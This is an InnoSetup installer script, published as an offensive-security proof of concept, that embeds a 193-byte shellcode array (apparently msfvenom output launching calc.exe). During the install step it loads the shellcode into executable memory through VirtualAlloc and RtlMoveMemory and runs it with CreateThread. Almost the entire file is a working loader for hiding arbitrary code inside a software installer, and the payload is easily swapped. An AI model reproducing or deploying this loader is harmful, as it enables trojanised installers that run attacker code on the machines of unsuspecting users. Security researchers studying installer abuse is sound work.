; --------------------------------------------------------------------------------------
; PoC Author: Jean-Pierre LESUEUR (@DarkCoderSc)                                       -
; https://www.phrozen.io/                                                              -
; https://www.github.com/darkcodersc                                                   -
; jplesueur@phrozen.io                                                                 -
;                                                                                      -
; Category: Offsec PoC                                                                 -
; Description:                                                                         -
;  Embedd shellcode inside InnoSetup for execution during setup installation.          -
;  The shellcode is executed using InnoSetup Pascal Code Engine through Windows API.   -
;
; REL: July 2021
; --------------------------------------------------------------------------------------

[Setup]
AppId={{D7EAA450-9906-4D8C-9E74-ED44DF692880}
AppName=InnoShellcode Example
AppVersion=1.5
AppPublisher=DarkCoderSc
AppPublisherURL=https://www.twitter.com/DarkCoderSc
AppSupportURL=https://www.twitter.com/DarkCoderSc
AppUpdatesURL=https://www.twitter.com/DarkCoderSc
CreateAppDir=no
PrivilegesRequired=lowest
OutputBaseFilename=innomal
Compression=lzma
SolidCompression=yes
WizardStyle=modern
Uninstallable=no

[Languages]
Name: "english"; MessagesFile: "compiler:Default.isl"

[Code]

type 
  TPayloadArray = array[0..193-1] of byte;

procedure ExitProcess(uExitCode: Integer); external 'ExitProcess@kernel32.dll stdcall';

function VirtualAlloc(lpAddress : PAnsiChar; dwSize : Cardinal; flAllocationType, flProtect : DWORD) : Cardinal; external 'VirtualAlloc@kernel32.dll stdcall';
function VirtualFree(lpAddress : Cardinal; dwSize : Cardinal; dwFreeType : DWORD) : BOOL; external 'VirtualFree@kernel32.dll stdcall';
function GetLastError() : DWORD; external 'GetLastError@kernel32.dll stdcall';
function CreateThread(lpThreadAttributes : PAnsiChar; dwStackSize : Cardinal; lpStartAddress : Cardinal; lpParameter : PAnsiChar; dwCreationFlags : DWORD; var lpThreadId : DWORD) : THANDLE; external 'CreateThread@kernel32.dll stdcall';
procedure RtlMoveMemory(Dest: Cardinal; var Source: TPayloadArray; Len: Integer); external 'RtlMoveMemory@kernel32.dll stdcall';
procedure OutputDebugAddress(lpAddress : Cardinal); external 'OutputDebugStringA@kernel32.dll stdcall';
procedure OutputDebugStringA(lpOutputString : PAnsiChar); external 'OutputDebugStringA@kernel32.dll stdcall';
function CryptBinaryToStringA(lpAddress : Cardinal; cbBinary, dwFlags : DWORD; pszString : Cardinal; var pcchString : DWORD) : BOOL; external 'CryptBinaryToStringA@crypt32.dll stdcall';

const MEM_COMMIT             = $00001000;
      MEM_RESERVE            = $00002000;
      PAGE_EXECUTE_READWRITE = $00000040; 
      PAGE_READWRITE         = $00000004;    
      CRYPT_STRING_HEX       = $00000004;
      MEM_RELEASE            = $00008000;
      
var pNil    : PAnsiChar; // Trick to defined missing "nil/null" instruction on InnoSetup: InnoSetup initialize variable to NULL.
    PAYLOAD : TPayloadArray;

{ _.GetMem }

function GetMem(const ASize : Cardinal; const AExecute : Boolean) : Cardinal;
var AFlags : DWORD;
    ARet   : Cardinal;
begin
  if AExecute then
    AFlags := PAGE_EXECUTE_READWRITE
  else
    AFlags := PAGE_READWRITE;

  ARet := VirtualAlloc(pNil, ASize, MEM_COMMIT or MEM_RESERVE, AFlags);

  if GetLastError() = 0 then
    result := ARet
  else begin
    OutputDebugStringA(Format('Failed to create memory region with last error=[%d].', [GetLastError()])); 

    result := 0;
  end;
end;

{ _.FreeMem }

procedure FreeMem(const lpAddress : Cardinal; const ASize : DWORD);
begin
  VirtualFree(lpAddress, ASize, MEM_RELEASE);
end;

{ _.DumpMemory }

procedure DumpMemory(const lpAddress : Cardinal; const ASize : DWORD);
var AMemAddr : Cardinal;
    AReqSize : DWORD;
begin
  CryptBinaryToStringA(lpAddress, ASize, CRYPT_STRING_HEX, 0, AReqSize);

  AMemAddr := GetMem(AReqSize, False);
  try
    CryptBinaryToStringA(lpAddress, ASize, CRYPT_STRING_HEX, AMemAddr, AReqSize);

    OutputDebugAddress(AMemAddr);
  finally
    FreeMem(lpAddress, ASize);
  end;
end;

{ _.InitializePayload }

(* Example payload:
   msfvenom -p windows/exec -a x86 --platform Windows CMD=calc.exe EXITFUNC=thread -f python -v payload
*)
procedure InitializePayload();
begin
  PAYLOAD[0] := $fc;
  PAYLOAD[1] := $e8;
  PAYLOAD[2] := $82;
  PAYLOAD[3] := $0; 
  PAYLOAD[4] := $0; 
  PAYLOAD[5] := $0;
  PAYLOAD[6] := $60;
  PAYLOAD[7] := $89;
  PAYLOAD[8] := $e5;
  PAYLOAD[9] := $31;
  PAYLOAD[10] := $c0;
  PAYLOAD[11] := $64;
  PAYLOAD[12] := $8b;
  PAYLOAD[13] := $50;
  PAYLOAD[14] := $30;
  PAYLOAD[15] := $8b;
  PAYLOAD[16] := $52;
  PAYLOAD[17] := $c;
  PAYLOAD[18] := $8b;
  PAYLOAD[19] := $52;
  PAYLOAD[20] := $14;
  PAYLOAD[21] := $8b;
  PAYLOAD[22] := $72;
  PAYLOAD[23] := $28;
  PAYLOAD[24] := $f;
  PAYLOAD[25] := $b7;
  PAYLOAD[26] := $4a;
  PAYLOAD[27] := $26;
  PAYLOAD[28] := $31;
  PAYLOAD[29] := $ff;
  PAYLOAD[30] := $ac;
  PAYLOAD[31] := $3c;
  PAYLOAD[32] := $61;
  PAYLOAD[33] := $7c;
  PAYLOAD[34] := $2;
  PAYLOAD[35] := $2c;
  PAYLOAD[36] := $20;
  PAYLOAD[37] := $c1;
  PAYLOAD[38] := $cf;
  PAYLOAD[39] := $d;
  PAYLOAD[40] := $1;
  PAYLOAD[41] := $c7;
  PAYLOAD[42] := $e2;
  PAYLOAD[43] := $f2;
  PAYLOAD[44] := $52;
  PAYLOAD[45] := $57;
  PAYLOAD[46] := $8b;
  PAYLOAD[47] := $52;
  PAYLOAD[48] := $10;
  PAYLOAD[49] := $8b;
  PAYLOAD[50] := $4a;
  PAYLOAD[51] := $3c;
  PAYLOAD[52] := $8b;
  PAYLOAD[53] := $4c;
  PAYLOAD[54] := $11;
  PAYLOAD[55] := $78;
  PAYLOAD[56] := $e3;
  PAYLOAD[57] := $48;
  PAYLOAD[58] := $1;
  PAYLOAD[59] := $d1;
  PAYLOAD[60] := $51;
  PAYLOAD[61] := $8b;
  PAYLOAD[62] := $59;
  PAYLOAD[63] := $20;
  PAYLOAD[64] := $1;
  PAYLOAD[65] := $d3;
  PAYLOAD[66] := $8b;
  PAYLOAD[67] := $49;
  PAYLOAD[68] := $18;
  PAYLOAD[69] := $e3;
  PAYLOAD[70] := $3a;
  PAYLOAD[71] := $49;
  PAYLOAD[72] := $8b;
  PAYLOAD[73] := $34;
  PAYLOAD[74] := $8b;
  PAYLOAD[75] := $1;
  PAYLOAD[76] := $d6;
  PAYLOAD[77] := $31;
  PAYLOAD[78] := $ff;
  PAYLOAD[79] := $ac;
  PAYLOAD[80] := $c1;
  PAYLOAD[81] := $cf;
  PAYLOAD[82] := $d;
  PAYLOAD[83] := $1;
  PAYLOAD[84] := $c7;
  PAYLOAD[85] := $38;
  PAYLOAD[86] := $e0;
  PAYLOAD[87] := $75;
  PAYLOAD[88] := $f6;
  PAYLOAD[89] := $3;
  PAYLOAD[90] := $7d;
  PAYLOAD[91] := $f8;
  PAYLOAD[92] := $3b;
  PAYLOAD[93] := $7d;
  PAYLOAD[94] := $24;
  PAYLOAD[95] := $75;
  PAYLOAD[96] := $e4;
  PAYLOAD[97] := $58;
  PAYLOAD[98] := $8b;
  PAYLOAD[99] := $58;
  PAYLOAD[100] := $24;
  PAYLOAD[101] := $1;
  PAYLOAD[102] := $d3;
  PAYLOAD[103] := $66;
  PAYLOAD[104] := $8b;
  PAYLOAD[105] := $c;
  PAYLOAD[106] := $4b;
  PAYLOAD[107] := $8b;
  PAYLOAD[108] := $58;
  PAYLOAD[109] := $1c;
  PAYLOAD[110] := $1;
  PAYLOAD[111] := $d3;
  PAYLOAD[112] := $8b;
  PAYLOAD[113] := $4;
  PAYLOAD[114] := $8b;
  PAYLOAD[115] := $1;
  PAYLOAD[116] := $d0;
  PAYLOAD[117] := $89;
  PAYLOAD[118] := $44;
  PAYLOAD[119] := $24;
  PAYLOAD[120] := $24;
  PAYLOAD[121] := $5b;
  PAYLOAD[122] := $5b;
  PAYLOAD[123] := $61;
  PAYLOAD[124] := $59;
  PAYLOAD[125] := $5a;
  PAYLOAD[126] := $51;
  PAYLOAD[127] := $ff;
  PAYLOAD[128] := $e0;
  PAYLOAD[129] := $5f;
  PAYLOAD[130] := $5f;
  PAYLOAD[131] := $5a;
  PAYLOAD[132] := $8b;
  PAYLOAD[133] := $12;
  PAYLOAD[134] := $eb;
  PAYLOAD[135] := $8d;
  PAYLOAD[136] := $5d;
  PAYLOAD[137] := $6a;
  PAYLOAD[138] := $1;
  PAYLOAD[139] := $8d;
  PAYLOAD[140] := $85;
  PAYLOAD[141] := $b2;
  PAYLOAD[142] := $0;
  PAYLOAD[143] := $0;
  PAYLOAD[144] := $0;
  PAYLOAD[145] := $50;
  PAYLOAD[146] := $68;
  PAYLOAD[147] := $31;
  PAYLOAD[148] := $8b;
  PAYLOAD[149] := $6f;
  PAYLOAD[150] := $87;
  PAYLOAD[151] := $ff;
  PAYLOAD[152] := $d5;
  PAYLOAD[153] := $bb;
  PAYLOAD[154] := $e0;
  PAYLOAD[155] := $1d;
  PAYLOAD[156] := $2a;
  PAYLOAD[157] := $a;
  PAYLOAD[158] := $68;
  PAYLOAD[159] := $a6;
  PAYLOAD[160] := $95;
  PAYLOAD[161] := $bd;
  PAYLOAD[162] := $9d;
  PAYLOAD[163] := $ff;
  PAYLOAD[164] := $d5;
  PAYLOAD[165] := $3c;
  PAYLOAD[166] := $6;
  PAYLOAD[167] := $7c;
  PAYLOAD[168] := $a;
  PAYLOAD[169] := $80;
  PAYLOAD[170] := $fb;
  PAYLOAD[171] := $e0;
  PAYLOAD[172] := $75;
  PAYLOAD[173] := $5;
  PAYLOAD[174] := $bb;
  PAYLOAD[175] := $47;
  PAYLOAD[176] := $13;
  PAYLOAD[177] := $72;
  PAYLOAD[178] := $6f;
  PAYLOAD[179] := $6a;
  PAYLOAD[180] := $0;
  PAYLOAD[181] := $53;
  PAYLOAD[182] := $ff;
  PAYLOAD[183] := $d5;
  PAYLOAD[184] := $63;
  PAYLOAD[185] := $61;
  PAYLOAD[186] := $6c;
  PAYLOAD[187] := $63;
  PAYLOAD[188] := $2e;
  PAYLOAD[189] := $65;
  PAYLOAD[190] := $78;
  PAYLOAD[191] := $65;
  PAYLOAD[192] := $0;
end;

{ _.CurStepChanged }

procedure CurStepChanged(CurStep: TSetupStep);
var AThreadId     : DWORD;    
    AThreadHandle : THandle;
    AMemAddr      : Cardinal;               
begin
  case CurStep of
      ssInstall : begin  
        OutputDebugStringA('Initialize Payload...');
        InitializePayload();

        ///
        OutputDebugStringA('Create new memory region to host our payload...');

        AMemAddr := GetMem(Length(PAYLOAD), True);       
        if (AMemAddr = 0) then                                                                           
          Exit;                         

        OutputDebugStringA(
          Format('Memory region successfully created at address=[%x(%d)], size=[%dB].', [
            AMemAddr,
            AMemAddr,
            Length(PAYLOAD)
          ])
         );        

        OutputDebugStringA('Copy our payload to new memory region...');
       
        RtlMoveMemory(AMemAddr, PAYLOAD, Length(PAYLOAD));  
        
        OutputDebugStringA('Payload successfully copied. Dumping memory region content:');
        DumpMemory(AMemAddr, Length(PAYLOAD));
        OutputDebugStringA('---');

        OutputDebugStringA('Execute payload in a separate thread...');
      
        AThreadHandle := CreateThread(pNil, 0, AMemAddr, pNil, 0, AThreadId);       
        if (AThreadHandle > 0) or (GetLastError <> 0) then
          OutputDebugStringA(Format('Payload successfully executed, ThreadHandle=[%d], ThreadId=[%d].', [AThreadHandle, AThreadId]))
        else
          OutputDebugStringA('Failed to execute payload.');     
      end;
  end;
end;
